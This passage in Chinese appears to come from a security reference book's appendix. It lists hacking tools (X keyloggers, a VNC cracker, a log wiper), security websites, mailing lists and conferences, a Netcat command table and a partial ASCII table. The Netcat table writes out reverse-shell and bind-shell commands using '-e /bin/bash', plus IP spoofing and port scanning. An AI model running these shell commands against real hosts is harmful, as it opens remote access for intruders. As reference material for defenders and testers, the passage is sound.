

| 名称 | 描述 | 位置 |
| :--- | :--- | :--- |
| Wget | 命令行 HTTP、HTTPS 和 FTP 客户端 | http://wget.suntsite.dk/ |
| Wlan-Jack | 对 802.11 网络执行拒绝服务攻击 | http://802.11ninjas.net/ |
| Xkey | 记录远程 X 会话的按键 | http://packetstormsecurity.org/ |
| Xprobe2 | 使用 ICMP 数据包执行操作系统指纹识别 | http://www.sys-security.com/html/tools/tools.html |
| Xremote | 向远程 X 会话发送鼠标和键盘事件 | http://www.infa.abo.fi/~chakie/xremote/ |
| Xscan | 记录远程 X 会话的按键 | http://packetstormsecurity.org/ |
| Xwatchwin | 监视远程 X 客户端 | http://packetstormsecurity.org/ |
| Vncrack | 破解和暴力破解 VNC 密码 | http://www.phenoelit.de/vncrack/ |
| Whisker | Web 服务器和 Web 应用程序漏洞扫描器 | http://www.wiretrip.net/rfp/doc.asp/12/d21.htm |
| Zap3 | 日志擦除器 | http://www.packetstormsecurity.org/ |
| Zebedee | 创建安全的 TCP 和 UDP 隧道 | http://www.winton.org.uk/zebedee/ |

# 网络资源

下表列出了最受欢迎的与安全相关的网络门户网站的位置。建议经常访问这些资源，以获取最新的安全新闻。

| 描述 | 位置 |
| --- | --- |
| 新闻、文章、邮件列表、漏洞和利用代码数据库 | http://securityfocus.com/ |
| 新闻、工具、公告和利用代码 | http://packetstormsecurity.nl/ |
| 工具、文章和链接 | http://insecure.org/ |
| CERT 协调中心：漏洞事件、安全实践、统计数据和培训 | http://www.cert.org/ |
| CVE（通用漏洞和暴露） | http://www.cve.mitre.org/ |
| SANS（系统管理、审计、网络、安全）研究所 | http://www.sans.org/ |
| CIAC（计算机事件告警能力） | http://www.ciac.org/ciac/ |
| 工具和论文 | http://www.packetfactory.net/ |
| 文章、公告、邮件列表和工具 | http://attrition.org/ |
| Phrack 杂志 | http://phrack.com/ |
| 2600：黑客季刊 | http://www.2600.com/ |
| 讨论区、链接和下载 | http://www.antionline.com/ |
| 漏洞披露列表 | http://www.vulnwatch.org/ |
| 文章和各种邮件列表存档 | http://www.neohapsis.com/ |
| 新闻、分析和评估 | http://internetsecuritynews.com/ |
| CERIA（信息保障与安全教育和研究中心） | http://www.cerias.purdue.edu/ |
| 新闻和文章 | http://www.hideaway.net/ |

# 邮件列表

下表列出了热门安全邮件列表的指引。建议订阅这些列表，因为它们会及时宣布最新的公告和漏洞。

| 描述 | 资源 |
|---|---|
| Bugtraq、渗透测试、Web 应用程序安全及其他许多列表 | [http://securityfocus.com/archive](http://securityfocus.com/archive) |
| CERT 公告邮件列表 | [http://www.cert.org/contact_cert/certmaillist.html](http://www.cert.org/contact_cert/certmaillist.html) |
| SANS（系统管理、审计、网络、安全）通讯 | [http://sans.org/sansnews](http://sans.org/sansnews) |

# 会议和活动

安全会议在全球各地举办，由领域专家展示计算机安全领域的动态。下表列出了流行的安全会议。

| 描述 | 资源 |
|---|---|
| Blackhat | [http://www.blackhat.com/](http://www.blackhat.com/) |
| DEF CON | [http://www.defcon.org/](http://www.defcon.org/) |
| SANS（系统管理、审计、网络、安全） | [http://www.sans.org/](http://www.sans.org/) |
| CSI（计算机安全协会） | [http://www.gocsi.com/](http://www.gocsi.com/) |
| RSA | [http://www.rsasecurity.com/company/events/index.html](http://www.rsasecurity.com/company/events/index.html) |

![](img/77287f6ef97ef0bed6e23f6610950d06_41_0.png)

![](img/77287f6ef97ef0bed6e23f6610950d06_41_1.png)

# 有用的 Netcat 命令

Netcat 是一个命令行工具，通过 TCP 和 UDP 协议在网络上传输数据。由于其能执行许多不同的功能，它被称为“网络瑞士军刀”。下表提供了最有用的 Netcat 命令的快速使用指南。

ⓘ Netcat 默认使用 TCP 协议。可以使用许多命令中的 `-u` 标志，使 Netcat 改用 UDP。

| 描述 | 命令 |
| --- | --- |
| 连接到远程主机上的端口 | nc remote_host <port> |
| 连接到远程主机上的多个端口 | nc remote_host <port>..<port><br>例如：<br>nc www.somecompanyasanexample.com 21 25 80 |
| 监听端口以接受传入连接 | nc -v -l -p <port> |
| 连接到远程主机并提供 bash shell | nc remote_ip <port> -e /bin/bash<br>注意 Netcat 默认不支持 -e 标志。为了使 Netcat 支持 -e 标志，必须使用 DGAPING_SECURITY_HOLE 选项重新编译它。 |
| 监听端口并在连接时提供 bash shell | nc -v -l -p <port> -e /bin/bash<br>注意 Netcat 默认不支持 -e 标志。为了使 Netcat 支持 -e 标志，必须使用 DGAPING_SECURITY_HOLE 选项重新编译它。 |
| 扫描远程主机的端口 | nc -v -z remote_host <port>--<port><br>使用 -i 标志设置延迟间隔：<br>nc -i <seconds> -v -z remote_host <port>--<port> |
| 将命令输出管道传输到 netcat 请求 | <command> \| nc remote_host <port><br>例如：<br>echo "GET / HTTP/1.0 [enter] [enter] \*" \| nc www.somecompanyasanexample.com 80 |
| 使用源路由连接到远程主机上的端口 | nc -g <gateway> remote_host <port><br>注意：使用 -g 标志最多可以指定八个跳点。使用 -G 标志指定源路由指针。 |
| 伪造源 IP 地址 | 使用 `--s` 标志伪造源 IP 地址：`nc --s spoofed_ip remote_host port`<br>此命令将导致远程主机响应到伪造的 IP 地址。`--s` 标志可以与本表中展示的大多数命令一起使用。 |
| 传输文件 | 在服务器主机上：<br>`nc -v -l -p <port> < <file>`<br><br>在客户端主机上：<br>`nc -v <server_host> <port> > <file>`<br><br>客户端主机也可以监听端口以接收文件。为此，在客户端主机上运行以下命令：<br>`nc -v -l -p <port> > file`<br><br>并在服务器主机上运行以下命令：<br>`nc -v <client_host> <port> < file` |

# ASCII 表

ASCII（美国信息交换标准代码）字符集包含 128 个条目，由控制代码、字母、数字和标点组成。下表以十进制、十六进制和八进制表示法展示了 ASCII 集合。

| 十进制 | 十六进制 | 八进制 | 字符 |
|---|---|---|---|
| 0 | 00 | 000 | NUL (空字符) |
| 1 | 01 | 001 | SOH (标题起始) |
| 2 | 02 | 002 | STX (文本起始) |
| 3 | 03 | 003 | ETX (文本结束) |
| 4 | 04 | 004 | EOT (传输结束) |
| 5 | 05 | 005 | ENQ (询问) |
| 6 | 06 | 006 | ACK (确认) |
| 7 | 07 | 007 | BEL (响铃) |
| 8 | 08 | 010 | BS (退格) |
| 9 | 09 | 011 | TAB (水平制表符) |
| 10 | 0a | 012 | LF (换行) |
| 11 | 0b | 013 | VT (垂直制表符) |
| 12 | 0c | 014 | FF (换页) |
| 13 | 0d | 015 | CR (回车) |
| 14 | 0e | 016 | SO (移出) |
| 15 | 0f | 017 | SI (移入) |
| 16 | 10 | 020 | DLE (数据链路转义) |
| 17 | 11 | 021 | DC1 (设备控制 1) |
| 18 | 12 | 022 | DC2 (设备控制 2) |
| 19 | 13 | 023 | DC3 (设备控制 3) |
| 20 | 14 | 024 | DC4 (设备控制 4) |
| 21 | 15 | 025 | NAK (否定确认) |
| 22 | 16 | 026 | SYN (同步空闲) |
| 23 | 17 | 027 | ETB (传输块结束) |
| 24 | 18 | 030 | CAN (取消) |
| 25 | 19 | 031 | EM (介质结束) |
| 26 | 1a | 032 | SUB (替代) |
| 27 | 1b | 033 | ESC (转义) |
| 28 | 1c | 034 | FS (文件分隔符) |
| 29 | 1d | 035 | GS (组分隔符) |
| 30 | 1e | 036 | RS (记录分隔符) |
| 31 | 1f | 037 | US (单元分隔符) |
| 32 | 20 | 040 | 空格 |
| 33 | 21 | 041 | ! |
| 34 | 22 | 042 | " |
| 35 | 23 | 043 | # |
| 36 | 24 | 044 | $ |
| 37 | 25 | 045 | % |
| 38 | 26 | 046 | & |
| 39 | 27 | 047 | ' |
| 40 | 28 | 050 | ( |
| 41 | 29 | 051 | ) |
| 42 | 2a | 052 | * |
| 43 | 2b | 053 | + |
| 44 | 2c | 054 | , |
| 45 | 2d | 055 | - |

